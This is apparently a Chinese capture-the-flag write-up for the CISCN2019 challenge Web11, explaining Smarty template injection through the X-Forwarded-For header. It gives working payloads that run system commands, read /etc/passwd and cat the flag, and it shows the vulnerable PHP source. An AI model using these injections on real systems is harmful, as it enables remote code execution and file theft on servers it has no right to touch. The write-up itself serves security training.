# \[CISCN2019 华东南赛区]Web11

## \[CISCN2019 华东南赛区]Web11

## 考点

* Smarty SSTI

## wp

其实是给了提示的，在请求头中加`XFF`，并且是smarty框架，smarty很经典的考点就是SSTI

![](<../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)

![](<../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png>)

burp抓包改XFF存在回显

![](<../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png>)

然后尝试SSTI

![](<../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png>)

再按照下图方法判断SSTI类型

![](../../.gitbook/assets/8sFfzWRJrj.png)

是Smarty SSTI

![](<../../.gitbook/assets/image (11) (1) (1) (1) (1) (1).png>)

Smarty支持使用`{php}{/php}`标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是在<mark style="color:red;">Smarty3中已经废弃{php}标签</mark>。在Smarty 3.1中，`{php}`仅在SmartyBC中可用。

利用方法：

1. `{self::getStreamVariable("file:///etc/passwd")}`在3.1.30版本删除
2. `{if phpinfo()}{/if}`
3. `{{system('ls')}}`

payload：`{{system('cat /flag')}}`

## 小结

1. smarty SSTI源码

```php
<?php

require_once('./smarty/libs/' . 'Smarty.class.php');

$smarty = new Smarty();

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];

$smarty->display("string:".$ip);

}
```
